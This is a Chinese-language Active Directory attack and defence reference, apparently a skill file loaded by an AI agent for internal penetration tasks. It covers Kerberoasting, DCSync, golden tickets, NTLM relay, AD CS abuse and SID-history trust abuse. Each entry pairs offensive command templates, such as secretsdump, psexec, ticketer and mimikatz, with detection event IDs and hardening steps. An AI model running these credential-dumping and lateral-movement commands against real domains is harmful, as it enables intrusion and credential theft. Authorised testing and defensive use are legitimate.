> 被 SKILL.md "10. On-Demand References" 索引。涉及内网渗透、域环境、Kerberos 攻击时加载。

# AD 域安全参考

## Kerberos 攻击

### AS-REP Roasting
- **原理**：用户账户未设置 Kerberos 预认证（`DONT_REQUIRE_PREAUTH`），攻击者可请求 TGT 并离线破解
- **命令**：`GetNPUsers.py [DOMAIN]/ -usersfile users.txt -format hashcat`
- **检测**：Event ID 4768（无预认证标记 `0x0`）
- **防护**：启用预认证；强密码策略；定期扫描非预认证账户

### Kerberoasting
- **原理**：请求域服务账号（SPN）的 TGS 票据，提取 NTLM 哈希离线破解
- **命令**：`GetUserSPNs.py [DOMAIN]/[USER]:[PASSWORD] -request`
- **检测**：Event ID 4769（异常大量的 TGS 请求，`TicketEncryptionType 0x17`）
- **防护**：服务账号使用复杂密码，使用组托管服务账号（gMSA），监控批量 TGS 请求

### DCSync
- **原理**：利用域复制协议（DRSUAPI）模拟域控从目标 DC 同步密码哈希
- **所需权限**：`Replicating Directory Changes` / `Replicating Directory Changes All`
- **命令**：`secretsdump.py -just-dc [DOMAIN]/[USER]:[PASSWORD]@[DC_IP]`
- **检测**：Event ID 4662（对目录复制权限的异常访问）
- **防护**：保护 Domain Admin / Enterprise Admin 组；监控非域控发起的复制请求

### Golden Ticket
- **原理**：获取 KRBTGT 哈希后伪造任意用户 TGT，无时间限制
- **命令**：`ticketer.py -nthash [KRBTGT_HASH] -domain [DOMAIN] -domain-sid [DOMAIN_SID] [USER]`
- **检测**：Event ID 4769（异常票据生命周期，KRBTGT 密码重置后旧票据仍有效）；4724（KRBTGT 密码重置事件）
- **防护**：定期轮换 KRBTGT 密码（两次）；保护域控；监控异常票据生命周期

### Silver Ticket
- **原理**：伪造服务账号 TGS 票据，访问特定服务（HOST/HTTP/HASH）
- **命令**：`ticketer.py -nthash [SERVICE_HASH] -domain-sid [SID] -spn [SPN] [USER]`
- **检测**：Event ID 4624/4634（异常登录类型 3 不匹配）
- **防护**：服务账号定期换密；限制服务账号权限；启用 PAC 验证

## NTLM 攻击

### Pass-the-Hash
- **命令**：`wmiexec.py -hashes [LM:NTLM] [DOMAIN]/[USER]@[TARGET]`
- **防护**：启用 SMB 签名；限制 Local Admin 权限；Windows Defender Credential Guard

### NTLM Relay
- **原理**：劫持 NTLM 认证请求并中继到目标服务器
- **命令**：`ntlmrelayx.py -tf targets.txt -smb2support`
- **防护**：启用 SMB 签名；禁用 LLMNR/mDNS/NBNS；配置 EPA（Extended Protection for Authentication）

## ACL 滥用（BloodHound）

| 权限 | 攻击效果 |
|------|---------|
| `GenericAll` | 完全控制目标对象 |
| `WriteOwner` | 修改对象所有者 |
| `WriteDACL` | 修改对象的 ACL |
| `ForceChangePassword` | 强制修改用户密码 |
| `AddMember` | 向组添加成员 |
| `AllowedToAct` | 基于资源的约束委派 |
| `GetChanges` | DCSync 所需权限 |

- **工具**：BloodHound CE / SharpHound
- **命令**：`bloodhound-python -d [DOMAIN] -u [USER] -p [PASSWORD] -c All`

## AD CS 攻击（Certified Pre-Owned）

| 攻击 | ESC # | 条件 |
|------|-------|------|
| 错误配置允许低权限用户请求域管理员证书 | ESC1 | `ENROLLEE_SUPPLIES_SUBJECT` + 管理员模板 |
| 模板允许任何用途 EKU 或无 EKU 限制 | ESC2 | Any Purpose EKU / 无 EKU 模板 |
| 注册代理模板不当 | ESC3 | 代理注册配置允许提权 |
| 易受攻击的模板可被低权限账户用于提权 | ESC4 | `WriteOwner/WriteDACL` 对模板有权限 |
| PKI 对象 ACL 漏洞（CA 证书/模板弱权限） | ESC5 | 对 PKI 对象的弱 ACL |
| CA 启用 `EDITF_ATTRIBUTESUBJECTALTSSL2` 标志 | ESC6 | 允许请求者在 SAN 中指定任意主体 |
| CA 本身 ACL 漏洞（`ManageCA` 权限） | ESC7 | 对 CA 的弱 ACE，可修改 CA 配置 |
| NTLM Relay 到 AD CS HTTP/Web 注册端点 | ESC8 | 启用 Web 注册接口 + NTLM 认证 |

- **命令**：`certipy find -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP]`
- **检测**：Event ID 4886/4887（证书服务请求和批准）
- **防护**：禁用 AD CS Web 注册；修复 ESC1-ESC7 模板配置与 ACL；审计模板和 CA 对象 ACL

## 域信任攻击

- **跨域信任**：通过 SID History 注入实现跨域提权
- **命令**：`mimikatz "kerberos::golden /domain:[TARGET_DOMAIN] /sid:[TARGET_SID] /sids:[PARENT_SID-519] /krbtgt:[KRBTGT_HASH]"`
- **检测**：Event ID 4765/4766（SID History 添加成功/失败）
- **防护**：最小化信任关系；启用 SID 过滤

## 参考命令

```bash
# 信息收集
netexec ldap [DC_IP] -u [USER] -p [PASSWORD] --bloodhound -ns [DNS]
netexec smb [TARGET] -u [USER] -p [PASSWORD] --shares
netexec smb [TARGET] -u [USER] -p [PASSWORD] --sessions

# 横向移动
psexec.py [DOMAIN]/[USER]:[PASSWORD]@[TARGET]
wmiexec.py [DOMAIN]/[USER]:[PASSWORD]@[TARGET]
atexec.py [DOMAIN]/[USER]:[PASSWORD]@[TARGET] "command"

# 凭证转储
secretsdump.py [DOMAIN]/[USER]:[PASSWORD]@[TARGET]
samdump.py [SYSTEM] [SAM]
cachedump.py [SYSTEM] [SECURITY]
```

## 防御清单
1. 限制 Domain Admin / Enterprise Admin 组成员
2. 启用 SMB 签名 + LDAP 签名
3. 禁用 LLMNR/mDNS/NBNS
4. 定期轮换 KRBTGT 密码（两次，间隔 24h）
5. 服务账号使用 gMSA
6. 部署 BloodHound 持续审计 ACL
7. 监控关键 Event ID：4768/4769/4776/4662/4765/4766/4886/4887
8. 实施 JIT 管理权限（PAM）
